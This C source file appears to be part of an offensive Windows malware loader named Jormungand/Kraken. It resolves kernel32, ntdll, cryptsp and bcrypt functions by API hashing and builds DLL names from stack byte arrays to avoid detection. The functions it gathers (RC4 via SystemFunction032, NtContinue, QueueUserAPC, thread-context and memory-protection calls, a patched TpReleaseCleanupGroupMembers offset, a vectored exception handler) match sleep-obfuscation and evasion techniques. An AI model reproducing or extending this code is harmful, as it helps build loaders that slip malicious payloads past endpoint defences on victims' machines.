#include "instance.h"

/*
Module name : Jormungand.exe hash : 0x53630fca
Module name : ntdll.dll hash : 0x22d3b5ed
Module name : KERNEL32.DLL hash : 0x6ddb9555
Module name : KERNELBASE.dll hash : 0x3ec3feb
Module name : VCRUNTIME140D.dll hash : 0x2ad0fce5
Module name : ucrtbased.dll hash : 0x7d5e04ec
*/

VOID InitInstanceKraken(PINSTANCE_KRAKEN Inst)
{
	Inst->wModule.pNtdll = fnGetModuleHandle(0x22d3b5ed);
	Inst->wModule.pKernel32 = fnGetModuleHandle(0x6ddb9555);

	Inst->wFunction.pCreateEventW = fnGetProcAddr(Inst->wModule.pKernel32, HASH_CreateEventW);
	Inst->wFunction.pCreateThread = fnGetProcAddr(Inst->wModule.pKernel32, HASH_CreateThread);
	Inst->wFunction.pGetThreadContext = fnGetProcAddr(Inst->wModule.pKernel32, HASH_GetThreadContext);
	Inst->wFunction.pVirtualProtect = fnGetProcAddr(Inst->wModule.pKernel32, HASH_VirtualProtect);
	Inst->wFunction.pWaitForSingleObject = fnGetProcAddr(Inst->wModule.pKernel32, HASH_WaitForSingleObject);
	Inst->wFunction.pSetEvent = fnGetProcAddr(Inst->wModule.pKernel32, HASH_SetEvent);

	Inst->wFunction.pQueueUserAPC = fnGetProcAddr(Inst->wModule.pKernel32, HASH_QueueUserAPC);
	Inst->wFunction.pTerminateThread = fnGetProcAddr(Inst->wModule.pKernel32, HASH_TerminateThread);
	Inst->wFunction.pCloseHandle = fnGetProcAddr(Inst->wModule.pKernel32, HASH_CloseHandle);
	Inst->wFunction.pLoadLibraryA = fnGetProcAddr(Inst->wModule.pKernel32, HASH_LoadLibraryA);

	Inst->wFunction.pTpReleaseCleanupGroupMembers = fnGetProcAddr(Inst->wModule.pNtdll, HASH_TpReleaseCleanupGroupMembers);
	(UINT_PTR)Inst->wFunction.pTpReleaseCleanupGroupMembers += 0x450;

	Inst->wFunction.pNtContinue = fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtContinue);
	Inst->wFunction.pNtTestAlert = fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtTestAlert);
	Inst->wFunction.pNtAlertResumeThread = fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtAlertResumeThread);
	Inst->wFunction.pRtlExitUserThread = fnGetProcAddr(Inst->wModule.pNtdll, HASH_RtlExitUserThread);

	BYTE bCryptSp[] = {'C', 'r', 'y', 'p', 't', 's', 'p', 0};
	Inst->wModule.pCryptsp = LoadLib(bCryptSp);
	Inst->wFunction.pSystemFunction032 = fnGetProcAddr(Inst->wModule.pCryptsp, 0xcccf3585);

	BYTE bCrypt[] = { 'B', 'c', 'r' , 'y', 'p', 't', 0 };
	Inst->wModule.pBcrypt = LoadLib(bCrypt);
	Inst->wFunction.pBCryptOpenAlgorithmProvider = fnGetProcAddr(Inst->wModule.pBcrypt, 0x2a15dfdd);
	Inst->wFunction.pBCryptGenRandom = fnGetProcAddr(Inst->wModule.pBcrypt, 0x3a73c634);
	Inst->wFunction.pBCryptCloseAlgorithmProvider = fnGetProcAddr(Inst->wModule.pBcrypt, 0xfcd0cdc1);
}

VOID InitInstanceHook(PHOOK_INSTANCE Inst)
{
	Inst->pModule = fnGetModuleHandle(0x6ddb9555);

	Inst->wFunction.pLoadLibraryA = fnGetProcAddr(Inst->pModule, HASH_LoadLibraryA);
	Inst->wFunction.pSleep = fnGetProcAddr(Inst->pModule, HASH_Sleep);
	Inst->wFunction.pVirtualAlloc = fnGetProcAddr(Inst->pModule, HASH_VirtualAlloc);
}

VOID InitInstanceMain(PMAIN_INSTANCE Inst)
{
	//Inst->pModule = fnGetModuleHandle(0x6ddb9555);

	Inst->wModule.Kernel32 = fnGetModuleHandle(0x6ddb9555);
	Inst->wModule.Ntdll = fnGetModuleHandle(0x22d3b5ed);

	Inst->wFunction.pCreateFileA = fnGetProcAddr(Inst->wModule.Kernel32, HASH_CreateFileA);
	Inst->wFunction.pGetFileSize = fnGetProcAddr(Inst->wModule.Kernel32, HASH_GetFileSize);
	Inst->wFunction.pReadFile = fnGetProcAddr(Inst->wModule.Kernel32, HASH_ReadFile);
	Inst->wFunction.pCloseHandle = fnGetProcAddr(Inst->wModule.Kernel32, HASH_CloseHandle);
	Inst->wFunction.pGetCurrentThread = fnGetProcAddr(Inst->wModule.Kernel32, HASH_GetCurrentThread);

	Inst->wFunction.pAddVectoredExceptionHandler = fnGetProcAddr(Inst->wModule.Ntdll, HASH_RtlAddVectoredExceptionHandler);
}

VOID InitLoaderInstance(PLOADER_INSTANCE InstLdr)
{
	InitInstanceHook(&InstLdr->hook);
	InitInstanceMain(&InstLdr->main);
	
}